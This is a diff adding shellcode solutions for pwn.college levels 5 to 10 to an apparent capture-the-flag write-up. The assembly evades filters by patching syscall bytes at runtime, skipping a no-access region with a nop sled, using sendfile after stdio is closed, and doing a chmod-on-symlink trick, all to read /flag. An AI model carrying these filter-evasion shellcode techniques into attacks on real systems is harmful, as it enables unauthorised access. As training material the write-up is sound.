@@ -169,3 +169,132 @@ _start:
     syscall
 ```
 
+### level5
+
+This level we cannot directly have `syscall` or `int` in our assembly, which gets translated to the according bytes. We can however modify the bytes in place during the runtime to get those bytes. 
+
+```asm
+.global _start
+.intel_syntax noprefix
+_start:
+    mov byte ptr [rip + syscall1], 0x0f
+    mov byte ptr [rip + syscall1 + 1], 0x05
+    mov byte ptr [rip + syscall2], 0x0f
+    mov byte ptr [rip + syscall2 + 1], 0x05
+    mov byte ptr [rip + syscall3], 0x0f
+    mov byte ptr [rip + syscall3 + 1], 0x05
+    mov byte ptr [rip + syscall4], 0x0f
+    mov byte ptr [rip + syscall4 + 1], 0x05
+
+    mov rax, 2
+    lea rdi, [rip + flag]
+    mov rsi, 0
+syscall1:
+    .byte 0x00
+    .byte 0x00
+    mov rdi, rax
+    mov rsi, rsp
+    mov rdx, 100
+    mov rax, 0
+syscall2:
+    .byte 0x00
+    .byte 0x00
+    mov rdi, 1
+    mov rsi, rsp
+    mov rdx, rax
+    mov rax, 1
+syscall3:
+    .byte 0x00
+    .byte 0x00
+    mov rax, 60
+syscall4:
+    .byte 0x00
+    .byte 0x00
+flag:
+    .ascii "/flag\0"
+```
+
+### level6
+
+Oh no! I won't have a read&write permissions in the first 4096 bytes of my shellcode! Well, then I will start my shellcode after 4096 bytes lol. I will fill the first 4096 bytes with 1-byte instruction, `nop` that does not do anything. Other than that, since this level shares the same constraints as `level5`, I will reuse the shellcode from `level5`. 
+
+Add this on top:
+
+```asm
+.rept 4096
+nop
+.endr
+```
+
+### level7
+
+This level limits my use of `stdin`, `stderr`, and `stdout`. More specifically, it will close the file descriptors 0-2. However, I can still use `sendfile` to transfer the datas of our flag file into one of my files. I named my file `~/meow` because I love cats. I will open `meow` in a similar way but with `rsi` set to 1, for write. Before I open my second file, `meow`, I will also push the file descriptor of opened `/flag` onto the stack for `sendfile`. 
+
+```asm
+    mov rax, 2
+    lea rdi, [rip + flag]
+    mov rsi, 0
+    syscall
+    push rax
+    mov rax, 2
+    lea rdi, [rip + meow]
+    mov rsi, 1
+    syscall
+    mov rdi, rax
+    pop rsi
+    mov rdx, 0
+    mov r10, 1000
+    mov rax, 40
+    syscall
+    mov rax, 60
+    syscall
+flag:
+    .ascii "/flag\0"
+meow:
+    .ascii "/home/hacker/meow\0"
+```
+
+### level8
+
+This level is similar to `level6`, but now it only takes `0x12` bytes of shellcode. This means that I will barely have a space to make one syscall. Looking through the discord channel for pwn.college revealed that the key was to use `chmod` and symlinks. I will first create a symbolic link to `/flag` called `f` in my home directory, more specifically the directory where I will run the challenge binary. Then I will change the `f`'s permission to `7`, which is read-write-exec for me. 
+
+```asm
+.global _start
+.intel_syntax noprefix
+_start:
+    mov al, 90
+    mov word ptr [rsp], 0x0066
+    mov rdi, rsp
+    mov sil, 7
+    syscall
+```
+
+### level9
+
+This level will replace every other 10 bytes with `0xcc`, which is a system call for debugger resulting in a pause of execution. To keep my shellcode short, I decided to reuse the idea from `level8`. To avoid the debugger call, I can first put `nop` calls on the locations where the bytes will be replaced and simply jump over them with `jmp`. 
+
+```asm
+    mov word ptr [rsp], 0x0066
+    jmp skip
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+skip:
+    mov al, 90
+    mov rdi, rsp
+    mov sil, 7
+    syscall
+```
+
+### level10
+
+This level will sort my shellcode. Thing is tho... using the code from `level9` still worked here too since the code was already somehow sorted. That made my life easier!
